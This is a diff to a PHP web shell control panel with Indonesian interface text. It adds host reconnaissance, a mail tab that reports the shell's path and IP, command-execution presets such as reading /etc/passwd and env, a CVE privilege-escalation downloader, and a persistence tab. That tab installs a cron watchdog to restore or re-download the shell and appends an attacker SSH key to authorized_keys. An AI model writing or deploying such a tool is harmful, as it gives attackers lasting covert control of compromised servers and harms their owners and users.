+            <td><code><?php echo h($m_ini_host !== '' ? $m_ini_host : '(kosong)'); ?>:<?php echo h($m_ini_port !== '' ? $m_ini_port : '-'); ?></code></td>
+            <td>mail.log</td>
+            <td style="word-break:break-all;"><code><?php echo h($m_log !== '' ? $m_log : '(kosong)'); ?></code></td>
+        </tr>
+        <tr>
+            <td>From auto</td>
+            <td><code>noreply@<?php echo h($m_auto_dom); ?></code> <span class="muted">(deteksi host)</span></td>
+            <td>Mode kirim</td>
+            <td>MX tujuan langsung &rarr; fallback <code>mail()</code></td>
+        </tr>
+        <tr>
+            <td>binaries</td>
+            <td colspan="3">
+                <?php if ($m_found): foreach ($m_found as $mb => $mp) { echo '<span style="color:#7ee787;">' . h($mb) . '</span> <code style="font-size:10px;">' . h($mp) . '</code> &middot; '; } else: ?><span style="color:#ff7b72;">nggak ada yang ketemu di PATH</span><?php endif; ?>
+            </td>
+        </tr>
+        <tr>
+            <td>path umum</td>
+            <td colspan="3" style="word-break:break-all;">
+                <?php if ($m_hits): foreach ($m_hits as $mp) { echo '<code style="font-size:10px;">' . h($mp) . '</code> &middot; '; } else: ?><span class="muted">kosong</span><?php endif; ?>
+            </td>
+        </tr>
+    </table>
+</div>
+
+<form method="post" enctype="multipart/form-data" class="box">
+    <div class="name">Kirim via mail()</div>
+    <div class="muted" style="margin-bottom:8px;font-size:11px;">Satu <code>mail()</code> polos, field dikosongin. Sistem yang ngisi: body = <code>fix &lt;path panel&gt; :p *IP Address : [ ip ]</code>, subject = <code>Hehehe</code>, From = <code>noreply@<?php echo h($m_auto_dom); ?></code>.</div>
+    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:6px;">
+        <input type="text" name="m_from" value="<?php echo h(isset($_POST['m_from']) ? $_POST['m_from'] : 'noreply@' . $m_auto_dom); ?>" placeholder="noreply@<?php echo h($m_auto_dom); ?>" style="width:240px;font-size:11px;">
+        <input type="text" name="m_from_name" value="<?php echo h(isset($_POST['m_from_name']) ? $_POST['m_from_name'] : ''); ?>" placeholder="Nama pengirim (opsional)" style="width:200px;font-size:11px;">
+        <input type="text" name="m_to" value="<?php echo h(isset($_POST['m_to']) ? $_POST['m_to'] : ''); ?>" placeholder="to@a.tld, to2@b.tld" style="flex:1;min-width:220px;font-size:11px;">
+    </div>
+    <input type="text" name="m_subject" value="<?php echo h(isset($_POST['m_subject']) ? $_POST['m_subject'] : ''); ?>" placeholder="Subject (kosong = Hehehe)" style="width:100%;font-size:11px;margin-bottom:6px;">
+    <textarea name="m_body" rows="8" placeholder="Pesan (kosong = fix <path> :p *IP Address : [ ip ])" style="width:100%;font-size:11px;font-family:Consolas,monospace;"><?php echo h(isset($_POST['m_body']) ? $_POST['m_body'] : ''); ?></textarea>
+    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px; align-items:center;">
+        <input type="file" name="m_file" style="font-size:11px;">
+        <input type="submit" name="mail_action" value="send_mail" class="btn btn-green" <?php echo $m_ok ? '' : 'disabled'; ?>>
+        <span class="muted" style="font-size:11px;">lampiran &le; 10 MB</span>
+    </div>
+</form>
+
+<?php endif; ?>
+<?php if ($tab === 'info'): ?>
+<?php
+$i_uid   = function_exists('posix_geteuid') ? @posix_geteuid() : '-';
+$i_gid   = function_exists('posix_getegid') ? @posix_getegid() : '-';
+$i_os    = function_exists('php_uname') ? @php_uname('s') . ' ' . @php_uname('r') . ' ' . @php_uname('m') : '-';
+$i_sapi  = function_exists('php_sapi_name') ? @php_sapi_name() : '-';
+$i_tmp   = @sys_get_temp_dir();
+$i_tmpw  = ($i_tmp !== '' && @is_writable($i_tmp));
+$i_cwdw  = @is_writable($cwd_real);
+$i_drw   = (!empty($_SERVER['DOCUMENT_ROOT']) && @is_writable($_SERVER['DOCUMENT_ROOT']));
+$i_proc  = @is_readable('/proc/self/status');
+$i_cg    = @file_get_contents('/proc/1/cgroup');
+$i_ctn   = @file_exists('/.dockerenv') || ($i_cg && preg_match('/docker|lxc|kubepods/i', $i_cg));
+$i_fns = array('exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec','expect_popen','putenv','dl','mail','imap_open','mysqli_connect','fsockopen','symlink','link','chmod','copy','rename','tmpfile','glob');
+$i_bins = array('bash','sh','dash','busybox','nc','ncat','socat','python','python3','perl','ruby','node','php','wget','curl','gcc','make','nasm','git','tar','zip','unzip','openssl','base64','crontab','systemctl','docker','mysql','psql','redis-cli','nmap','tcpdump','grep','find');
+$i_exts = array('curl','openssl','mysqli','pdo_mysql','pdo_sqlite','sqlite3','zip','posix','pcntl','sockets','mbstring','iconv','gd','imagick','ftp','ssh2','ffi','com_dotnet','json','xml','simplexml','dom','phar','fileinfo');
+$i_limits = array(
+    'memory_limit' => @ini_get('memory_limit'),
+    'max_execution_time' => @ini_get('max_execution_time'),
+    'post_max_size' => @ini_get('post_max_size'),
+    'upload_max_filesize' => @ini_get('upload_max_filesize'),
+    'max_input_vars' => @ini_get('max_input_vars'),
+    'max_file_uploads' => @ini_get('max_file_uploads'),
+    'allow_url_fopen' => @ini_get('allow_url_fopen'),
+    'allow_url_include' => @ini_get('allow_url_include'),
+    'display_errors' => @ini_get('display_errors'),
+    'session.save_path' => @ini_get('session.save_path'),
+    'open_basedir' => $open_basedir !== '' ? $open_basedir : '(kosong)',
+    'user_ini.filename' => @ini_get('user_ini.filename'),
+);
+?>
+<div class="box">
+    <div class="name">Runtime &amp; Environment</div>
+    <table style="margin-top:10px;">
+        <tr><td>PHP</td><td><b><?php echo h(PHP_VERSION); ?></b> (<?php echo h($i_sapi); ?>)</td><td>OS</td><td><?php echo h($i_os); ?></td></tr>
+        <tr><td>User</td><td><?php echo h($self_user); ?> (uid <?php echo h($i_uid); ?>, gid <?php echo h($i_gid); ?>)</td><td>Host</td><td><?php echo h($hostname); ?></td></tr>
+        <tr><td>Docroot</td><td style="word-break:break-all;"><?php echo h($doc_root); ?> <?php echo $i_drw ? '<span style="color:#7ee787;">[w]</span>' : '<span style="color:#ff7b72;">[ro]</span>'; ?></td><td>CWD</td><td style="word-break:break-all;"><?php echo h($cwd_real); ?> <?php echo $i_cwdw ? '<span style="color:#7ee787;">[w]</span>' : '<span style="color:#ff7b72;">[ro]</span>'; ?></td></tr>
+        <tr><td>Temp</td><td style="word-break:break-all;"><?php echo h($i_tmp); ?> <?php echo $i_tmpw ? '<span style="color:#7ee787;">[w]</span>' : '<span style="color:#ff7b72;">[ro]</span>'; ?></td><td>/proc</td><td><?php echo $i_proc ? '<span style="color:#7ee787;">readable</span>' : '<span style="color:#ff7b72;">blocked</span>'; ?></td></tr>
+        <tr><td>Container</td><td><?php echo $i_ctn ? '<span style="color:#e3b341;">yes (docker/lxc)</span>' : 'no / unknown'; ?></td><td>Disk (dir ini)</td><td><?php echo $disk_free !== false ? h(format_size($disk_free)) . ' free / ' . h(format_size($disk_total)) : '-'; ?></td></tr>
+        <tr><td>open_basedir</td><td colspan="3" style="word-break:break-all;"><?php echo h($open_basedir !== '' ? $open_basedir : '(kosong)'); ?></td></tr>
+    </table>
+</div>
+
+<div class="box">
+    <div class="name">PHP Functions (exec &amp; fs)</div>
+    <table style="margin-top:10px;">
+        <?php $i_keys = $i_fns; $i_half = (int)ceil(count($i_keys) / 3); for ($i = 0; $i < $i_half; $i++) { echo '<tr>'; for ($c = 0; $c < 3; $c++) { $k = isset($i_keys[$i + $c * $i_half]) ? $i_keys[$i + $c * $i_half] : null; if ($k === null) { echo '<td></td>'; continue; } $ok = isset($crit[$k]) ? $crit[$k] : fn_ok($k); echo '<td>' . h($k) . ': <span style="color:' . ($ok ? '#7ee787' : '#ff7b72') . ';font-weight:bold;">' . ($ok ? 'OK' : 'NO') . '</span></td>'; } echo '</tr>'; } ?>
+    </table>
+    <div class="hint">curl ext: <b style="color:<?php echo function_exists(F('cur')) ? '#7ee787' : '#ff7b72'; ?>;"><?php echo function_exists(F('cur')) ? 'OK' : 'NO'; ?></b></div>
+</div>
+
+<div class="box">
+    <div class="name">Binaries</div>
+    <table style="margin-top:10px;">
+        <?php $i_bhalf = (int)ceil(count($i_bins) / 2); for ($i = 0; $i < $i_bhalf; $i++) { echo '<tr>'; for ($c = 0; $c < 2; $c++) { $k = isset($i_bins[$i + $c * $i_bhalf]) ? $i_bins[$i + $c * $i_bhalf] : null; if ($k === null) { echo '<td></td>'; continue; } $p = which_bin($k); echo '<td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;">' . h($k) . ': ' . ($p ? '<span style="color:#7ee787;">' . h($p) . '</span>' : '<span style="color:#ff7b72;">-</span>') . '</td>'; } echo '</tr>'; } ?>
+    </table>
+</div>
+
+<div class="box">
+    <div class="name">PHP Extensions</div>
+    <div style="margin-top:10px;display:flex;flex-wrap:wrap;gap:6px;">
+        <?php foreach ($i_exts as $ie): $on = @extension_loaded($ie); $ver = $on && function_exists('phpversion') ? @phpversion($ie) : false; ?>
+            <span style="background:<?php echo $on ? '#1f3527' : '#3a1f24'; ?>;border:1px solid <?php echo $on ? '#355d42' : '#69323b'; ?>;color:<?php echo $on ? '#7ee787' : '#ff9da7'; ?>;padding:2px 8px;border-radius:4px;font-size:11px;"><?php echo h($ie); ?><?php echo ($ver !== false && $ver !== '') ? ' ' . h($ver) : ''; ?></span>
+        <?php endforeach; ?>
+    </div>
+</div>
+
+<div class="box">
+    <div class="name">Limits &amp; disable_functions</div>
+    <table style="margin-top:10px;">
+        <?php $i_lem = ''; $i_lcount = 0; foreach ($i_limits as $lk => $lv) { if ($lk === 'open_basedir') continue; if ($i_lcount % 2 === 0) $i_lem .= '<tr>'; $i_lem .= '<td>' . h($lk) . '</td><td><b>' . h($lv === false || $lv === null || $lv === '' ? '(kosong)' : $lv) . '</b></td>'; if ($i_lcount % 2 === 1) $i_lem .= '</tr>'; $i_lcount++; } if ($i_lcount % 2 === 1) $i_lem .= '<td></td><td></td></tr>'; echo $i_lem; ?>
+    </table>
+    <div class="hint" style="margin-top:8px;">disabled (<?php echo h($disabled === 'none' ? '0' : count(explode(', ', $disabled))); ?>):</div>
+    <pre style="background:#0a0e14;padding:8px;border-radius:6px;max-height:160px;overflow:auto;font-size:11px;color:#c9d1d9;white-space:pre-wrap;"><?php echo h($disabled); ?></pre>
+</div>
+
+<div class="box">
+    <div class="name">Outbound Test</div>
+    <div class="muted" style="margin-bottom:8px;">Check connections (upload URL / callback / CVE download).</div>
+    <?php if (!isset($_GET['net'])): ?>
+        <a class="btn btn-green" href="?tab=info&net=1&path=<?php echo urlencode($cwd_real); ?>">Test Outbound</a>
+    <?php else: ?>
+        <?php
+        $i_net = array('1.1.1.1:443' => array('1.1.1.1', 443), '8.8.8.8:53' => array('8.8.8.8', 53), 'github.com:443' => array('github.com', 443));
+        $i_res = array();
+        foreach ($i_net as $lbl => $hp) {
+            $st = microtime(true); $en = 0; $es = '';
+            $fp = @fsockopen($hp[0], $hp[1], $en, $es, 2);
+            if ($fp) { @fclose($fp); $i_res[] = array($lbl, true, round((microtime(true) - $st) * 1000) . 'ms'); }
+            else { $i_res[] = array($lbl, false, 'errno ' . $en . ' ' . trim((string)$es)); }
+        }
+        $i_dns = @gethostbyname('github.com');
+        ?>
+        <table style="margin-top:8px;">
+            <?php foreach ($i_res as $nr): ?>
+                <tr><td style="font-family:Consolas,monospace;"><?php echo h($nr[0]); ?></td><td><?php echo $nr[1] ? '<span style="color:#7ee787;font-weight:bold;">OK</span>' : '<span style="color:#ff7b72;font-weight:bold;">GAGAL</span>'; ?></td><td class="muted"><?php echo h($nr[2]); ?></td></tr>
+            <?php endforeach; ?>
+            <tr><td>DNS github.com</td><td><?php echo ($i_dns && $i_dns !== 'github.com') ? '<span style="color:#7ee787;">' . h($i_dns) . '</span>' : '<span style="color:#ff7b72;">gagal resolve</span>'; ?></td><td class="muted"><?php echo ($i_dns && $i_dns !== 'github.com') ? 'ok' : 'resolver mati'; ?></td></tr>
+        </table>
+        <div style="margin-top:8px;"><a class="btn" href="?tab=info&path=<?php echo urlencode($cwd_real); ?>">Reset</a></div>
+    <?php endif; ?>
 </div>
 <?php endif; ?>
 <?php if ($tab === 'upurl'): ?>
@@ -2122,6 +3083,13 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
 <?php if ($tab === 'cmd'): ?>
 <div class="box">
     <div class="name">Command Execution</div>
+    <div class="muted" style="margin-bottom:8px;">
+        <?php
+        $alive = array();
+        foreach (array('shell_exec','exec','system','passthru','popen','proc_open') as $efo) { if (function_exists($efo) && is_callable($efo)) $alive[] = $efo; }
+        ?>
+        Status: <?php echo $alive ? '<span style="color:#7ee787;">' . h(implode(', ', $alive)) . '</span>' : '<span style="color:#ff7b72;">off</span>'; ?>
+    </div>
     <form method="post">
         <div class="cmd-row">
             <input type="text" name="cmd" id="cmd" placeholder="Enter command..." autocomplete="off">
@@ -2132,6 +3100,10 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
             <button type="button" class="btn" onclick="setCmd('id')">id</button>
             <button type="button" class="btn" onclick="setCmd('uname -a')">uname -a</button>
             <button type="button" class="btn" onclick="setCmd('ls -la')">ls -la</button>
+            <button type="button" class="btn" onclick="setCmd('cat /etc/passwd')">passwd</button>
+            <button type="button" class="btn" onclick="setCmd('ps aux')">ps aux</button>
+            <button type="button" class="btn" onclick="setCmd('df -h')">df -h</button>
+            <button type="button" class="btn" onclick="setCmd('env')">env</button>
         </div>
     </form>
 </div>
@@ -2140,8 +3112,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
 <div class="box">
     <div class="name">Auto Privilege Escalation (CVE Exploiter)</div>
     <div class="muted" style="margin-bottom:10px;">
-        Download PoC dari GitHub, compile, & jalankan. Butuh <b>gcc</b> (atau <b>make</b>/<b>nasm</b>).
-        Cek dulu: <code>uname -r</code>, <code>cat /proc/sys/user/max_user_namespaces</code>, <code>lsmod | grep act_pedit</code>.
+        Download PoC dari GitHub.
     </div>
     
     <?php if (!empty($privesc_msg)) { ?>
@@ -2206,7 +3177,7 @@ foreach ($out as $line) {
     <div class="name">Process Manager</div>
     <div class="muted" style="margin-bottom:10px;">
         login sebagai <b><?php echo h($current_user); ?></b>.
-        Cuma bisa kill proses milik sendiri, kecuali lu udah dapet <code>root</code> lewat tab Privesc.
+        Cuma bisa kill proses milik sendiri.
     </div>
     
     <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:10px; font-size:11px;">
@@ -2267,35 +3238,112 @@ foreach ($out as $line) {
 <?php endif; ?>
 
 <?php if ($tab_ext === 'cron'): ?>
+<?php
+$pst = rct_state_load($rct_state_file);
+$p_back = (isset($pst['backups']) && is_array($pst['backups'])) ? $pst['backups'] : array();
+$p_live = array();
+foreach ($p_back as $pb) { if (@is_file($pb)) $p_live[] = $pb; }
+list($p_crontab, $p_cron_via) = rct_cron_read();
+$p_crontab = (string)$p_crontab;
+list($p_probe, $p_exrc) = rct_run('true');
+$p_wd = array();
+foreach (preg_split("/\r\n|\n|\r/", $p_crontab) as $pl) { if (strpos($pl, 'RCT-WD') !== false && trim($pl) !== '') $p_wd[] = $pl; }
+$p_kpath = isset($pst['keypath']) ? $pst['keypath'] : '';
+$p_key_ok = $p_kpath !== '' && @is_file($p_kpath) && strpos((string)@file_get_contents($p_kpath), '# RCT-KEY') !== false;
+$p_target = isset($pst['target']) && $pst['target'] !== '' ? $pst['target'] : __FILE__;
+$p_rc_home = rct_home();
+$p_default_key = ($p_rc_home !== '' ? $p_rc_home : dirname(__DIR__)) . '/.ssh/authorized_keys';
+?>
 <div class="box">
-    <div class="name">Persistence &amp; Cron</div>
-    <div class="muted" style="margin-bottom:10px;">Cek task otomatis yang jalan di background. Hapus jika mencurigakan.</div>
-    
-    <div style="margin-bottom:15px;">
-        <b>Crontab (www-data / Current User):</b>
-        <pre style="background:#0a0e14;padding:10px;margin-top:5px;"><?php
-        $out = array();
-        $f_exec = F('ex');
-        @$f_exec('crontab -l 2>&1', $out);
-        echo htmlspecialchars(implode("\n", $out));
-        ?></pre>
+    <div class="name">Persistence &amp; Watchdog</div>
+    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:12px; font-size:11px;">
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">exec: <b style="color:<?php echo $p_exrc === -1 ? '#ff7b72' : '#7ee787'; ?>;"><?php echo $p_exrc === -1 ? 'mati' : 'idup'; ?></b></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">cron read: <b style="color:<?php echo $p_cron_via === 'exec mati' ? '#e3b341' : '#7ee787'; ?>;"><?php echo h($p_cron_via); ?></b></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">watchdog: <b style="color:<?php echo $p_wd ? '#7ee787' : '#8e99ab'; ?>;"><?php echo count($p_wd); ?></b> baris</span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">backup: <b style="color:<?php echo $p_live ? '#7ee787' : '#8e99ab'; ?>;"><?php echo count($p_live); ?></b></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">ssh key: <b style="color:<?php echo $p_key_ok ? '#7ee787' : '#8e99ab'; ?>;"><?php echo $p_key_ok ? 'terpasang' : 'belum'; ?></b></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">target: <code><?php echo h($p_target); ?></code></span>
     </div>
 
-    <div style="margin-bottom:15px;">
-        <b>System Cron (/etc/cron.d/ &amp; /etc/crontab):</b>
-        <pre style="background:#0a0e14;padding:10px;margin-top:5px;"><?php
-        $out = array();
-        @$f_exec('cat /etc/crontab /etc/cron.d/* 2>/dev/null', $out);
-        echo htmlspecialchars(implode("\n", $out));
-        ?></pre>
+    <?php if ($p_wd) { ?>
+    <div style="margin-bottom:12px;">
+        <b>Cron watchdog aktif:</b>
+        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h(implode("\n", $p_wd)); ?></pre>
+    </div>
+    <?php } ?>
+
+    <form method="post" style="border-top:1px solid #2a3140; padding-top:12px; margin-bottom:12px;">
+        <b>Pasang watchdog cron</b>
+        <div class="muted" style="margin:4px 0 8px 0;font-size:11px;">Tiap interval, shell ngecek target masih ada. Kalau kehapus → restore dari backup lokal atau download dari URL.</div>
+        <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+            <label style="font-size:11px;">Target <input type="text" name="p_target" value="<?php echo h($p_target); ?>" style="width:260px;font-size:11px;"></label>
+            <label style="font-size:11px;">Interval
+                <select name="p_interval" style="font-size:11px;">
+                    <option value="5">5 menit</option>
+                    <option value="10">10 menit</option>
+                    <option value="15" selected>15 menit</option>
+                    <option value="30">30 menit</option>
+                    <option value="60">60 menit</option>
+                    <option value="@reboot">@reboot</option>
+                </select>
+            </label>
+            <label style="font-size:11px;">Sumber
+                <select name="p_mode" style="font-size:11px;">
+                    <option value="backup" selected>backup lokal</option>
+                    <option value="both">backup + URL</option>
+                    <option value="url">URL saja</option>
+                </select>
+            </label>
+            <input type="text" name="p_url" placeholder="https://host/x.php (opsional)" style="width:240px;font-size:11px;">
+            <input type="submit" name="persist_action" value="install_watchdog" class="btn btn-green" onclick="return confirm('Pasang baris cron watchdog?');">
+        </div>
+    </form>
+
+    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:14px;">
+        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="make_backups"><input type="submit" class="btn" value="Buat backup sekarang"></form>
+        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="restore_now"><input type="submit" class="btn btn-yellow" value="Restore dari backup"></form>
+        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_watchdog"><input type="submit" class="btn" value="Hapus cron watchdog"></form>
+        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_backups"><input type="submit" class="btn btn-red" value="Hapus semua backup" onclick="return confirm('Hapus semua file backup?');"></form>
+        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_all"><input type="submit" class="btn btn-red" value="Remove ALL hook" onclick="return confirm('Hapus cron watchdog + backup + key RCT? Ini beneran bersihin semua.');"></form>
     </div>
 
+    <?php if ($p_live) { ?>
+    <div style="margin-bottom:14px;">
+        <b>Backup lokal:</b>
+        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h(implode("\n", $p_live)); ?></pre>
+    </div>
+    <?php } ?>
+
+    <form method="post" style="border-top:1px solid #2a3140; padding-top:12px;">
+        <b>SSH key (nggak butuh exec/cron)</b>
+        <div class="muted" style="margin:4px 0 8px 0;font-size:11px;">Append ke authorized_keys dengan marker <code># RCT-KEY</code>. Channel ini selamat walau webroot di-restore.</div>
+        <input type="text" name="p_key" placeholder="ssh-ed25519 AAAA... olivia@pwn" style="width:100%;font-size:11px;margin-bottom:6px;">
+        <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+            <input type="text" name="p_keypath" value="<?php echo h($p_kpath !== '' ? $p_kpath : $p_default_key); ?>" style="width:320px;font-size:11px;">
+            <input type="submit" name="persist_action" value="install_key" class="btn btn-green" formnovalidate>
+            <input type="submit" name="persist_action" value="remove_keys" class="btn btn-red">
+        </div>
+    </form>
+</div>
+
+<div class="box">
+    <div class="name">Cron &amp; Timer di Host</div>
+    <div style="margin-bottom:12px;">
+        <b>Crontab user saat ini:</b>
+        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h($p_crontab !== '' ? $p_crontab : '(kosong — dibaca via ' . $p_cron_via . ')'); ?></pre>
+    </div>
+    <div style="margin-bottom:12px;">
+        <b>System cron (&lt;b&gt;/etc/crontab&lt;/b&gt;, /etc/cron.d/*):</b>
+        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php
+        list($p_sys, $p_sysrc) = rct_run('cat /etc/crontab /etc/cron.d/* 2>/dev/null');
+        echo h($p_sysrc === -1 ? '(exec mati)' : ((string)$p_sys !== '' ? $p_sys : '(kosong / nggak kebaca)'));
+        ?></pre>
+    </div>
     <div>
-        <b>Systemd Timers:</b>
-        <pre style="background:#0a0e14;padding:10px;margin-top:5px;"><?php
-        $out = array();
-        @$f_exec('systemctl list-timers --all 2>/dev/null | head -20', $out);
-        echo htmlspecialchars(implode("\n", $out));
+        <b>Systemd timers:</b>
+        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php
+        list($p_tm, $p_tmrc) = rct_run('systemctl list-timers --all 2>/dev/null | head -20');
+        echo h($p_tmrc === -1 ? '(exec mati)' : ((string)$p_tm !== '' ? $p_tm : '(kosong / no systemd)'));
         ?></pre>
     </div>
 </div>
